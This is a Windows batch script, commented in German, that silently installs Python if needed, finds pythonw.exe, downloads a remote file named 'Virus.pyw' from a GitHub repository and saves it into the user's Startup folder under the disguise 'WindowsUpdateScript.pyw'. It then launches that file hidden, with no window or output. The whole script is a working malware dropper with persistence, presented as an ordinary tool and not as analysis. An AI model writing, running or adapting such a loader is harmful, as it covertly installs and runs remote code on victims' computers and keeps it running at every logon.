@echo off
setlocal enabledelayedexpansion

set "PYTHON_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0.exe"
set "INSTALLER=python-3.12.0.exe"
set "SCRIPT_URL=https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/Virus.pyw"
set "SCRIPT_NAME=WindowsUpdateScript.pyw"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Prüfen, ob Python installiert ist (für die Installation)
python --version >nul 2>&1
if %errorlevel% neq 0 (
    :download_installer
    curl -s -L "%PYTHON_URL%" -o "%INSTALLER%"
    if %errorlevel% neq 0 (
        timeout /t 2 /nobreak >nul
        goto :download_installer
    )
    start /wait "" "%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
    del /f /q "%INSTALLER%" >nul 2>&1
)

:: ========== PYTHONW.EXE SUCHEN ==========
set "PYTHONW="

:: 1. Im PATH
for %%A in (pythonw.exe pythonw) do (
    where %%A >nul 2>&1
    if !errorlevel! equ 0 (
        for /f "delims=" %%B in ('where %%A') do set "PYTHONW=%%B" & goto :found
    )
)

:: 2. In Standard-Installationspfaden
if exist "%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" & goto :found
if exist "%LocalAppData%\Programs\Python\Python312\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312\pythonw.exe" & goto :found
if exist "%ProgramFiles%\Python312\pythonw.exe" set "PYTHONW=%ProgramFiles%\Python312\pythonw.exe" & goto :found
if exist "%ProgramFiles(x86)%\Python312-32\pythonw.exe" set "PYTHONW=%ProgramFiles(x86)%\Python312-32\pythonw.exe" & goto :found

:: 3. Registry durchsuchen (HKLM und HKCU)
for %%H in (HKLM HKCU) do (
    for /f "skip=2 tokens=1,2*" %%A in ('reg query "%%H\SOFTWARE\Python" /s 2^>nul ^| find "InstallPath"') do (
        if exist "%%C\pythonw.exe" set "PYTHONW=%%C\pythonw.exe" & goto :found
    )
)

:: 4. Fallback: Einfach pythonw.exe annehmen (falls im PATH, aber nicht gefunden? unwahrscheinlich)
set "PYTHONW=pythonw.exe"

:found
:: ========== SKRIPT LADEN UND STARTEN ==========
curl -s -L "%SCRIPT_URL%" -o "%STARTUP_DIR%\%SCRIPT_NAME%"

:: Starten mit dem gefundenen pythonw (kein Fenster, keine Ausgaben)
start /b "" "%PYTHONW%" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1

exit
